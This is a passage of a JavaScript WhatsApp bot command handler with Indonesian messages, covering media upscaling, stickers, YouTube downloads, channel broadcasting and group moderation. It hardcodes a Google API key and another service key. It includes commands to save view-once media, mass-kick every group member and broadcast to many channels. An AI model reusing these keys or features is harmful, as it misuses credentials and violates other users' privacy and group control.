                const statusResult = await imgupscale.cek(code, scaleRatio);

                if (statusResult.code === 200 && statusResult.data.status === 'success') {
                    return {
                        success: true,
                        downloadUrls: statusResult.data.downloadUrls
                    };
                }

                if (statusResult.data.status === 'error') {
                    throw new Error('Processing failed on server');
                }
                await new Promise(resolve => setTimeout(resolve, retryDelay));
            }
            throw new Error('Processing timeout - maximum retries exceeded');
        }
    };

    if (!m.quoted || !/image/.test(m.quoted.mimetype || '')) {
        return m.reply('Reply gambar dengan perintah .hd 2x atau .hd 4x');
    }

    const scale = args[0]?.replace(/x/i, '') || '2';
    if (!availableScaleRatio.includes(Number(scale))) {
        return m.reply('Pilih resolusi: 2x atau 4x');
    }

    let tmpPath;
    try {
        await m.reply('⏳ Sedang memproses gambar, mohon tunggu...');
        
const buffer = await luna.downloadMediaMessage(m.quoted);
        const tmpDir = './tmp';
        const fs = require('fs');
        if (!fs.existsSync(tmpDir)) {
            fs.mkdirSync(tmpDir, { recursive: true });
        }
        
        const { default: path } = await import('path');
        tmpPath = path.join(tmpDir, `sanhua_hd_${Date.now()}.jpg`);
        fs.writeFileSync(tmpPath, buffer);

        const result = await imgupscale.upscale(tmpPath, Number(scale));
        
        if (!result.success || !result.downloadUrls?.length) {
            throw new Error('Gagal melakukan upscale gambar.');
        }

        await luna.sendMessage(m.chat, { 
            image: { url: result.downloadUrls[0] }, 
            caption: `✅ Gambar berhasil ditingkatkan menjadi ${scale}x`
        }, { quoted: m });

    } catch (e) {
        m.reply(`Terjadi error: ${e.message}`);
    } finally {
        const fs = require('fs');
        if (tmpPath && fs.existsSync(tmpPath)) {
            fs.unlinkSync(tmpPath);
        }
    }
}
break

case 'hdvid': {
    luna.videohd = luna.videohd || {};
    if (m.sender in luna.videohd) return m.reply("Sabar, lagi proses ya, jangan dispam.");

    if (!text) return m.reply(`Contoh: ${prefix + command} 1080 60fps`);

    const resolutions = {
        "480": "480", "720": "720", "1080": "1080",
        "2k": "1440", "4k": "2160", "8k": "4320"
    };

    let [res, fpsText] = text?.trim().toLowerCase().split(" ");
    let fps = 60;
    if (fpsText && fpsText.endsWith("fps")) {
        fps = parseInt(fpsText.replace("fps", ""));
        if (isNaN(fps) || fps < 30 || fps > 240) {
            return m.reply("❗ FPS harus antara 30 - 240 (contoh: 60fps)");
        }
    }

    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || q.mediaType || '';
    if (!/^video/.test(mime)) return m.reply("Perintah ini hanya untuk video. Silakan reply video yang ingin diubah.");
    
    if (!resolutions[res]) return m.reply(`Resolusi tidak valid.\n\nPilihan: ${Object.keys(resolutions).join(", ")}\nContoh: ${prefix + command} 1080`);

    luna.videohd[m.sender] = true;
    let inputPath;
    let outputPath;

    try {
        await m.reply(`⏳ Mengubah video ke ${res.toUpperCase()} ${fps}FPS...`);
        
        const tmpDir = './tmp';
        if (!fs.existsSync(tmpDir)) {
            fs.mkdirSync(tmpDir, { recursive: true });
        }

        const id = m.sender.split("@")[0];
        inputPath = `./tmp/input_${id}.mp4`;
        outputPath = `./tmp/hdvideo_${id}.mp4`;
        
        const buffer = await luna.downloadMediaMessage(q);
        fs.writeFileSync(inputPath, buffer);

        if (!fs.existsSync(inputPath)) {
            throw new Error("Gagal menyimpan file video sementara. Cek izin folder atau coba lagi.");
        }

        const targetHeight = resolutions[res];
        const form = new FormData();
        form.append("video", fs.createReadStream(inputPath));
        form.append("resolution", targetHeight);
        form.append("fps", fps);

        const response = await axios.post("http://193.149.164.168:4167/hdvideo", form, {
            headers: form.getHeaders(), maxBodyLength: Infinity,
            maxContentLength: Infinity, responseType: "stream"
        });

        const writer = fs.createWriteStream(outputPath);
        response.data.pipe(writer);

        writer.on("finish", async () => {
            try {
                const videoBuffer = fs.readFileSync(outputPath);
                await luna.sendMessage(m.chat, {
                    video: videoBuffer, mimetype: 'video/mp4',
                    fileName: `video_${res}_${fps}fps.mp4`,
                    caption: `✅ Video berhasil diubah ke ${res.toUpperCase()} ${fps}FPS`
                }, { quoted: m });
            } catch (sendError) {
                m.reply("Gagal mengirim video yang telah diproses.");
            } finally {
                delete luna.videohd[m.sender];
                if (fs.existsSync(inputPath)) fs.unlinkSync(inputPath);
                if (fs.existsSync(outputPath)) fs.unlinkSync(outputPath);
            }
        });
        
        writer.on("error", (err) => {
            throw new Error("Gagal menulis file video yang telah diproses.");
        });

    } catch (e) {
        Reply("Terjadi kesalahan: " + e.message);
        delete luna.videohd[m.sender];
        if (inputPath && fs.existsSync(inputPath)) fs.unlinkSync(inputPath);
        if (outputPath && fs.existsSync(outputPath)) fs.unlinkSync(outputPath);
    }
}
break

            case 'bratvid': {
                if (!text) return reply(`Contoh: ${prefix+command} hai`)

                const words = text.split(" ")
                const tempDir = path.join(process.cwd(), 'lib')
                if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir)
                const framePaths = []

                try {
                    for (let i = 0; i < words.length; i++) {
                        const currentText = words.slice(0, i + 1).join(" ")

                        const res = await axios.get(
                            `https://aqul-brat.hf.space/?text=${encodeURIComponent(currentText)}`, {
                                responseType: "arraybuffer"
                            }
                        ).catch((e) => e.response)

                        const framePath = path.join(tempDir, `frame${i}.mp4`)
                        fs.writeFileSync(framePath, res.data)
                        framePaths.push(framePath)
                    }

                    const fileListPath = path.join(tempDir, "filelist.txt")
                    let fileListContent = ""

                    for (let i = 0; i < framePaths.length; i++) {
                        fileListContent += `file '${framePaths[i]}'\n`
                        fileListContent += `duration 0.7\n`
                    }

                    fileListContent += `file '${framePaths[framePaths.length - 1]}'\n`
                    fileListContent += `duration 2\n`

                    fs.writeFileSync(fileListPath, fileListContent)
                    const outputVideoPath = path.join(tempDir, "output.mp4")
                    execSync(
                        `ffmpeg -y -f concat -safe 0 -i ${fileListPath} -vf "fps=30" -c:v libx264 -preset ultrafast -pix_fmt yuv420p ${outputVideoPath}`
                    )

                    await luna.sendAsSticker(m.chat, outputVideoPath, m, {
                        packname: 'Made By Cy,bro botz',
                        author: `\nDibuat Oleh ${m.pushName}`
                    })

                    framePaths.forEach((frame) => {
                        if (fs.existsSync(frame)) fs.unlinkSync(frame)
                    })
                    if (fs.existsSync(fileListPath)) fs.unlinkSync(fileListPath)
                    if (fs.existsSync(outputVideoPath)) fs.unlinkSync(outputVideoPath)
                } catch (e) {
                    console.error(e)
                    m.reply('Terjadi kesalahan')
                }
            }
            break

case "brat": {
if (!text) return reply(example('teksnya'))
const axios = require('axios');
let brat = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=false&delay=500`
let response = await axios.get(brat, { responseType: "arraybuffer" })
let videoBuffer = response.data;
try {
await luna.sendAsSticker(m.chat, videoBuffer, m, {packname: global.packname})
} catch {}
}
break

case "bratgambar2": {
  if (!text) {
    const colorList = `
*Daftar Kode Warna Umum*

*Dasar:*
• Hitam: #000000
• Putih: #FFFFFF
• Merah: #FF0000
• Hijau: #00FF00
• Biru: #0000FF
• Kuning: #FFFF00
• Cyan: #00FFFF
• Magenta: #FF00FF

*Lainnya:*
• Abu: #808080
• Navy: #000080
• Orange: #FFA500
• Pink: #FFC0CB
• Emas: #FFD700

Format: 
*bratimg2 teks | fontColor | bgColor*
Contoh:
bratimg2 Halo World | #FF0000 | #FFFFFF
`.trim();
    return m.reply(colorList);
  }
  const axios = require('axios');
  const [teks, fontColor, bgColor] = text.split("|").map(v => v?.trim());
  const finalText = teks || 'Yubi 😗😗';
  const finalFontColor = fontColor || '#000000';
  const finalBgColor = bgColor || '#FFFFFF';
  const apiUrl = `https://fastrestapis.fasturl.cloud/maker/brat/advanced?text=${encodeURIComponent(finalText)}&font=Arial&fontSize=auto&fontPosition=justify&fontBlur=3&fontColor=${encodeURIComponent(finalFontColor)}&bgColor=${encodeURIComponent(finalBgColor)}`;

  try {
    let response = await axios.get(apiUrl, { responseType: "arraybuffer" });
    let buffer = response.data;
    await luna.sendAsSticker(m.chat, buffer, m, { packname: global.packname });
  } catch (err) {
    console.error("Error bratimg2:", err);
    m.reply('Gagal membuat sticker. Coba lagi nanti.');
  }
}
break

case "cekidch": case "idch": {
if (!text) return reply(example("linkchnya 🤨"))
if (!text.includes("https://whatsapp.com/channel/")) return reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await luna.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy ID Channel\",\"id\":\"123456789\",\"copy_code\":\"${res.id}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qloc})
await luna.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break

case "rvo": case "readviewonce": {
if (!isOwner) return reply(mess.owner)
if (!m.quoted) return m.reply(example("dengan reply pesannya"))
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return luna.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return luna.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return luna.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break

case 'tourl2': {
    const fetch = require('node-fetch');
    const FormData = require('form-data');
    const q = m.quoted ? m.quoted : m;
    const mimetype = (q.msg || q).mimetype || q.mediaType || '';
    if (!/webp/.test(mimetype)) {
        luna.sendMessage(m.chat, {
            react: {
                text: '⏰',
                key: m.key,
            }
        });

        try {
            const media = await q.download?.();
            const fileSizeInBytes = media.length;
            const fileSizeInKB = (fileSizeInBytes / 1024).toFixed(2);
            const fileSizeInMB = (fileSizeInBytes / (1024 * 1024)).toFixed(2);
            const fileSize = fileSizeInMB >= 1 ? `${fileSizeInMB} MB` : `${fileSizeInKB} KB`;
            const form = new FormData();
            form.append('reqtype', 'fileupload');
            let ext = mimetype.split('/')[1] || '';
            if (ext) ext = `.${ext}`;
            form.append('fileToUpload', media, `file${ext}`);
            const res = await fetch('https://catbox.moe/user/api.php', {
                method: 'POST',
                body: form
            });
            const result = await res.text();
            const url = result.trim();
            const caption = `🔗 URL: ${url}\n\n*Ukuran:* ${fileSize}`;
            await luna.sendMessage(m.chat, { text: caption }, { quoted: m });
        } catch (e) {
            console.error(e);
            m.reply(`[ ! ] Gagal mengunggah file. Error: ${e.message}`);
        }
    } else {
        Reply(`File *.webp* tidak didukung. Kirim atau reply file lain dengan caption *${usedPrefix + command}*`);
    }
};
break

case 'yt':
case 'youtube': {
 const axios = require('axios');
 if (!text) return m.reply(`Contoh penggunaan:
• yt search lofi
• yt channel lofi girl
• yt latest lofi girl
• yt stat https://youtube.com/watch?v=abc123`);

 const subcmd = text.split(' ')[0].toLowerCase();
 const query = text.replace(subcmd, '').trim();
 const apikey = 'AIzaSyBI6P58kEwxWywxh_UeCUpQC7_T5xwieTg';

 if (!['search', 'channel', 'latest', 'stat'].includes(subcmd))
 return m.reply('Subfitur tidak dikenal. Gunakan salah satu: search, channel, latest, stat');

 try {
 if (subcmd === 'search') {
 if (!query) return m.reply('Contoh: yt search lofi chill');
 const { data } = await axios.get(`https://www.googleapis.com/youtube/v3/search`, {
 params: {
 part: 'snippet',
 q: query,
 key: apikey,
 type: 'video',
 maxResults: 30 
 }
 });

 if (!data.items.length) return m.reply('Video tidak ditemukan.');
 let teks = '*Hasil Pencarian YouTube:*\n\n';
 data.items.forEach(v => {
 teks += `• *${v.snippet.title}*\n`;
 teks += ` Channel: ${v.snippet.channelTitle}\n`;
 teks += ` Link: https://youtube.com/watch?v=${v.id.videoId}\n\n`;
 });
 return m.reply(teks);
 }

 if (subcmd === 'channel') {
 if (!query) return m.reply('Contoh: yt channel lofi girl');
 const search = await axios.get(`https://www.googleapis.com/youtube/v3/search`, {
 params: {
 part: 'snippet',
 q: query,
 type: 'channel',
 key: apikey
 }
 });

 const ch = search.data.items[0];
 if (!ch) return m.reply('Channel tidak ditemukan.');
 const channelId = ch.id.channelId;
 const detail = await axios.get(`https://www.googleapis.com/youtube/v3/channels`, {
 params: {
 part: 'snippet,statistics,brandingSettings',
 id: channelId,
 key: apikey
 }
 });

 const info = detail.data.items[0];
 if (!info) return m.reply('Gagal mengambil detail channel.');
 const bannerUrl = info.brandingSettings?.image?.bannerExternalUrl;
 const cap = `*Channel Info:*
• *Nama:* ${info.snippet.title}
• *Subscriber:* ${info.statistics.subscriberCount}
• *Views:* ${info.statistics.viewCount}
• *Total Video:* ${info.statistics.videoCount}
• *Dibuat:* ${new Date(info.snippet.publishedAt).toLocaleDateString()}
• *Lokasi:* ${info.snippet.country || 'Tidak diketahui'}
• *Link:* https://youtube.com/channel/${channelId}

*Deskripsi:*\n${info.snippet.description?.slice(0, 500) || 'Tidak ada deskripsi.'}`;

 await luna.sendMessage(m.chat, {
 image: { url: info.snippet.thumbnails.high.url },
 caption: cap
 }, { quoted: m });

 if (bannerUrl) await luna.sendMessage(m.chat, {
 image: { url: bannerUrl },
 caption: 'Banner Channel'
 }, { quoted: m });
 return;
 }

 if (subcmd === 'latest') {
 if (!query) return m.reply('Contoh: yt latest lofi girl');
 const search = await axios.get(`https://www.googleapis.com/youtube/v3/search`, {
 params: {
 part: 'snippet',
 q: query,
 type: 'channel',
 key: apikey
 }
 });

 const ch = search.data.items[0];
 if (!ch) return m.reply('Channel tidak ditemukan.');
 const channelId = ch.id.channelId;
 const latest = await axios.get(`https://www.googleapis.com/youtube/v3/search`, {
 params: {
 key: apikey,
 channelId,
 part: 'snippet,id',
 order: 'date',
 maxResults: 1
 }
 });

 const vid = latest.data.items[0];
 if (!vid) return m.reply('Video terbaru tidak ditemukan.');
 const caption = `*Video Terbaru dari ${vid.snippet.channelTitle}:*
• *Judul:* ${vid.snippet.title}
• *Link:* https://youtube.com/watch?v=${vid.id.videoId}`;

 return luna.sendMessage(m.chat, {
 image: { url: vid.snippet.thumbnails.high.url },
 caption
 }, { quoted: m });
 }

 if (subcmd === 'stat') {
 if (!query.includes('youtube.com/watch')) return m.reply('Contoh: yt stat https://youtube.com/watch?v=abc123');
 const videoId = new URL(query).searchParams.get('v');
 const res = await axios.get(`https://www.googleapis.com/youtube/v3/videos`, {
 params: {
 part: 'snippet,statistics,status,contentDetails',
 id: videoId,
 key: apikey
 }
 });

 const video = res.data.items[0];
 if (!video) return m.reply('Video tidak ditemukan.');
 const cap = `*Statistik Video:*
• *Judul:* ${video.snippet.title}
• *Channel:* ${video.snippet.channelTitle}
• *Tayang:* ${new Date(video.snippet.publishedAt).toLocaleDateString()}
• *Views:* ${video.statistics.viewCount}
• *Likes:* ${video.statistics.likeCount}
• *Komentar:* ${video.statistics.commentCount}
• *Kategori ID:* ${video.snippet.categoryId}
• *Status:* ${video.status.privacyStatus}
• *Lisensi:* ${video.status.license}
• *Tags:* ${video.snippet.tags?.slice(0, 5).join(', ') || 'Tidak ada tag'}
• *Link:* https://youtube.com/watch?v=${videoId}

*Deskripsi:* 
${video.snippet.description?.slice(0, 1000) || 'Tidak ada deskripsi.'}`;
 return m.reply(cap);
 }
 } catch (err) {
 console.error(err);
 return m.reply('Gagal mengambil data dari YouTube. Coba lagi nanti.');
 }
}
break

case 'ytmp3': case 'ytaudio':
 if (!text) return m.reply('Masukkan judul lagu yang ingin dicari!');
 try {
 const axios = require('axios');
 const fs = require('fs');
 const path = require('path');
 await luna.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } });
 let apiUrl = `https://api.alvianuxio.eu.org/api/play?query=${encodeURIComponent(text)}&apikey=kayzuMD&format=mp3`;
 let { data } = await axios.get(apiUrl, { timeout: 15000 });
 if (!data || !data.data || !data.data.response) {
 return m.reply('Gagal menemukan lagu.');
 }
 let song = data.data.response;
 let caption = `🎵 *Judul:* ${song.title}\n`
 + `⏳ *Durasi:* ${song.duration}\n`
 + `📅 *Upload:* ${song.uploadDate}\n`
 + `?? *Views:* ${song.views?.toLocaleString() || 'N/A'}\n`
 + `🎤 *Channel:* ${song.channel?.name || 'Unknown'}\n`
 + `?? *Video:* ${song.videoUrl}\n`
 + `🎧 *Download:* ${song.download}`;
 const videoId = song.videoUrl.includes('v=') ? song.videoUrl.split('v=')[1].split('&')[0] : null;
 const thumbnailUrl = videoId ? `https://i.ytimg.com/vi/${videoId}/hqdefault.jpg` : null;
 await luna.sendMessage(m.chat, {
 text: caption,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true,
 title: song.title,
 body: `Music Player`,
 mediaType: 1,
 thumbnailUrl: thumbnailUrl,
 sourceUrl: song.videoUrl
 }
 }
 }, { quoted: m });
 const sanitizedTitle = song.title.replace(/[^\w\s-]/gi, '_').substring(0, 50);
 let audioPath = path.join(__dirname, `temp_${Date.now()}_${sanitizedTitle}.mp3`);
 try {
 const response = await axios({
 method: 'get',
 url: song.download,
 responseType: 'arraybuffer',
 timeout: 60000,
 headers: {
 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
 }
 });
 if (!response.data || response.data.length === 0) {
 throw new Error('Empty response data');
 }
 fs.writeFileSync(audioPath, Buffer.from(response.data));
 try {
 await luna.sendMessage(m.chat, {
 audio: fs.readFileSync(audioPath),
 mimetype: 'audio/mpeg',
 fileName: `${sanitizedTitle}.mp3`,
 }, { quoted: m });
 } catch (audioSendError) {
 await luna.sendMessage(m.chat, {
 document: fs.readFileSync(audioPath),
 mimetype: 'audio/mpeg',
 fileName: `${sanitizedTitle}.mp3`,
 }, { quoted: m });
 }
 if (fs.existsSync(audioPath)) {
 fs.unlinkSync(audioPath);
 }
 await luna.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
 } catch (downloadError) {
 try {
 const alternativeUrl = `https://api.akuari.my.id/downloader/youtube?link=${song.videoUrl}`;
 const altResponse = await axios.get(alternativeUrl);
 if (altResponse.data && altResponse.data.mp3) {
 const audioResponse = await axios({
 method: 'get',
 url: altResponse.data.mp3,
 responseType: 'arraybuffer',
 timeout: 60000
 });
 audioPath = path.join(__dirname, `temp_alt_${Date.now()}_${sanitizedTitle}.mp3`);
 fs.writeFileSync(audioPath, Buffer.from(audioResponse.data));
 await luna.sendMessage(m.chat, {
 document: fs.readFileSync(audioPath),
 mimetype: 'audio/mpeg',
 fileName: `${sanitizedTitle}.mp3`,
 }, { quoted: m });

 if (fs.existsSync(audioPath)) {
 fs.unlinkSync(audioPath);
 }
 await luna.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
 } else {
 throw new Error('Alternative API failed');
 }
 } catch (altError) {
 if (fs.existsSync(audioPath)) {
 fs.unlinkSync(audioPath);
 }
 m.reply('Gagal mengunduh audio. Coba lagi nanti.');
 await luna.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
 }
 }
 } catch (error) {
 m.reply('Terjadi kesalahan saat mencari atau memproses lagu.');
 await luna.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
 }
 break

case 'play3':
case 'play-v3': 
case 'ytplay3': {
 if (!text) return m.reply(`Example: ${prefix + command} Lagu sad`);
 try {		
 let search = await yts(`${text}`);
 if (!search || search.all.length === 0) return m.reply(`*Lagu tidak ditemukan!* ☹️`);
 let { videoId, image, title, views, duration, author, ago, url, description } = search.all[0];
 let caption = `「 *YOUTUBE PLAY* 」\n\n🆔 ID : ${videoId}\n💬 Title : ${title}\n📺 Views : ${views}\n⏰ Duration : ${duration.timestamp}\n▶️ Channel : ${author.name}\n📆 Upload : ${ago}\n🔗 URL Video : ${url}\n📝 Description : ${description}`;
 
 await luna.sendMessage(m.chat, {
 image: { url: image },
 caption: caption,
 footer: `${global.namaOwner}`,
 buttons: [
 {
 buttonId: 'action',
 buttonText: { displayText: 'Pilih Tindakan' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: 'Pilih Format Download',
 sections: [
 {
 title: 'Opsi Download',
 highlight_label: 'Recommended',
 rows: [
 {
 title: 'YouTube Music',
 id: `${prefix}ytmp3 ${url}`
 },
 {
 title: 'YouTube Music V2',
 id: `${prefix}ytmp3-v2 ${url}`
 },
 {
 title: 'YouTube Video',
 id: `${prefix}ytmp4 ${url}`
 },
 {
 title: 'YouTube Video V2',
 id: `${prefix}ytmp4-v2 ${url}`
 },
 {
 title: 'YouTube Video V3',
 id: `${prefix}ytmp4-v3 ${url}`
 }
 ]
 }
 ]
 })
 }
 }
 ],
 headerType: 1,
 viewOnce: true,
 contextInfo: {
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: global.idSaluran,
 newsletterName: global.namaSaluran
 }
 }
 }, { quoted: m });
 } catch (err) {
 console.error(err);
 m.reply(`*Terjadi kesalahan!* 😭\n${err.message || err}`);
 }
}
break

case "jpmch": {
 if (!isOwner) return reply(mess.owner) 
 if (!text && !m.quoted) return m.reply(example("Teksnya atau reply teks")); 
 var teks = m.quoted ? m.quoted.text : text; 
 let total = 0; 
 
 global.channels ??= loadChannels(); 
 
 if (global.channels.length === 0) 
 return reply(` 
╔══════════════════════════╗ 
 ❌ *SALAHAN* ❌ 
╚══════════════════════════╝ 
⚠️ Tidak ada saluran terdaftar untuk *JPM*! 
Silakan daftarkan saluran terlebih dahulu. 
`); 

 Reply(` 
╭─❰ *PROCESSING MESSAGE* ❱─╮ 
📮 *Mengirim Pesan Ke*: 
 ➥ *${global.channels.length} Saluran* 
⏳ *Mohon Tunggu...* 
╰─────────────────────╯ 
 `); 
 
 for (let id of global.channels) { 
 try { 
 await luna.sendMessage(id, { text: teks }, { quoted: qloc }); 
 total += 1; 
 } catch (e) { 
 console.log(`⚠️ Gagal mengirim ke ${id}:`, e); 
 } 
 await sleep(global.delayJpm); 
 } 
 
 m.reply(` 
╭─❰ *RESULT SUMMARY* ❱─╮ 
📨 *Pesan Terkirim*: 
 ➥ *${total} Saluran* 
✅ *Status*: Berhasil! 
*Jeda : ${global.cooldown}*
💌 Terima kasih telah menggunakan layanan ini. 
╰─────────────────────╯ 
 `); 
} 
break

case "delidch": {
    if (!isOwner) return reply(mess.owner);
    if (!text) return reply("Harap masukkan nomor atau ID saluran yang ingin dihapus!");

    global.channels ??= loadChannels();

    if (!isNaN(text)) {
        let index = parseInt(text.trim()) - 1;

        if (start < 0 || start >= global.channels.length) {
            return m.reply("Nomor urut tidak valid!");
        }

        let removed = global.channels.splice(index, 1);
        saveChannels(global.channels);

        m.reply(`Berhasil menghapus ID Saluran: *${removed[0]}*`);
    } else {
        let channelId = text.trim();

        if (!global.channels.includes(channelId)) {
            return reply("ID Saluran tidak ditemukan!");
        }

        global.channels = global.channels.filter((id) => id !== channelId);
        saveChannels(global.channels);

        Reply(`Berhasil menghapus ID Saluran: *${channelId}*`);
    }
}
break

case "addidch": {
 if (!isOwner) return m.reply(!isOwner);
 if (!text) return reply("Harap masukkan link saluran!");

 let channelLink = text.trim();

 if (!channelLink.includes("https://whatsapp.com/channel/")) {
 return m.reply("Link saluran tidak valid! Harus berupa link WhatsApp (https://whatsapp.com/channel/...)");
 }

 let channelId = channelLink.split("https://whatsapp.com/channel/")[1];
 if (!channelId) return m.reply("Gagal mengekstrak ID dari link saluran!");

 try {
 let res = await luna.newsletterMetadata("invite", channelId);

 if (!res.id) return reply("ID saluran tidak valid!");

 global.channels ??= loadChannels();

 if (global.channels.includes(res.id)) {
 return m.reply(`ID Saluran *${res.id}* sudah terdaftar!`);
 }

 global.channels.push(res.id);
 saveChannels(global.channels);

 Reply(`Berhasil menambahkan ID Saluran *${res.id}* dari link:\n${channelLink}\n\nNama Saluran: ${res.name}`);
 } catch (e) {
 console.error(e);
 Reply("Terjadi kesalahan saat memproses link saluran. Pastikan link valid!");
 }
}
break

case "tagall": {
if (!isOwner && !isPremium) return reply(mess.owner)
if (!text) return m.reply(example("pesannya"))
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await luna.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: m})
}
break

case "add": {
if (!isOwner && !isPremium) return reply(mess.owner)
if (text) {
const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await luna.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await luna.groupParticipantsUpdate(m.chat, [input], 'add')
if (Object.keys(res).length == 0) {
return m.reply(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
} else {
return m.reply(JSON.stringify(res, null, 2))
}} else {
return m.reply(example("62838###"))
}
}
break

case "ht": case "hidetag": {
if (!isOwner && !isPremium) return reply(mess.owner)
if (!text) return m.reply(example("pesannya"))
let member = m.metadata.participants.map(v => v.id)
await luna.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: m})
}
break

case "kick": case "kik": {
if (!isOwner && !isPremium) return reply(mess.owner)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await luna.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await luna.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return m.reply(example("@tag/reply"))
}
}
break

case "leave": {
if (!isOwner && !isPremium) return reply(mess.owner)
await m.reply("Baik, Saya Akan Keluar Dari Grup Ini")
await sleep(4000)
await luna.groupLeave(m.chat)
}
break

/* 
case "opengc": case "open": {
if (!isOwner && !isPremium) return reply(mess.owner)
if (/open|opengc/.test(command)) {
if (m.metadata.announce == false) return 
await luna.groupSettingUpdate(m.chat, 'not_announcement')
} else if {}
}
break

case "closegc": case "close": {
if (!isOwner && !isPremium) return reply(mess.owner)
 (/closegc|close/.test(command)) {
if (m.metadata.announce == true) return 
await luna.groupSettingUpdate(m.chat, 'announcement')
} else {}
}
break
*/

case "kudetagc": case "kudeta": {
if (!isOwner) return reply(mess.owner)
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return m.reply("Grup Ini Sudah Tidak Ada Member!")
await m.reply("Kudeta Grup Khusus Owner")
for (let i of memberFilter) {
await luna.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await m.reply("Kudeta Grup Telah Berhasil 🏴‍☠️")
}
break

case "demote":
case "promote": {
if (!isOwner && !isPremium) return reply(mess.owner)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await luna.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await luna.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return m.reply(example("@tag/628xxx"))
}
}
break

case "mute": {
if (!isOwner && !isPremium) return reply(mess.owner)
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].mute == true) return m.reply(`*Mute* di grup ini sudah aktif!`)
global.db.groups[m.chat].mute = true
return m.reply("Berhasil menyalakan *mute* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].mute == false) return m.reply(`*Mute* di grup ini tidak aktif!`)
global.db.groups[m.chat].mute = false
return m.reply("Berhasil mematikan *mute* di grup ini")
} else return m.reply(example("on/off"))
}
break

case "antilink2": {
if (!m.isGroup) return reply(mess.group)
if (!isOwner) return reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].antilink2 == true) return m.reply(`*Antilink2* di grup ini sudah aktif!`)
if (global.db.groups[m.chat].antilink == true) global.db.groups[m.chat].antilink = false
global.db.groups[m.chat].antilink2 = true
return reply("Berhasil menyalakan *antilink2* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].antilink2 == false) return m.reply(`*Antilink2* di grup ini tidak aktif!`)
global.db.groups[m.chat].antilink2 = false
return reply("Berhasil mematikan *antilink2* di grup ini")
} else return m.reply(example("on/off"))
}
break

case "antilink": {
if (!m.isGroup) return reply(mess.group)
if (!isOwner) return reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].antilink == true) return m.reply(`*Antilink* di grup ini sudah aktif!`)
if (global.db.groups[m.chat].antilink2 == true) global.db.groups[m.chat].antilink2 = false
global.db.groups[m.chat].antilink = true
return reply("Berhasil menyalakan *antilink* di grup ini")
} else if (teks == "off") {
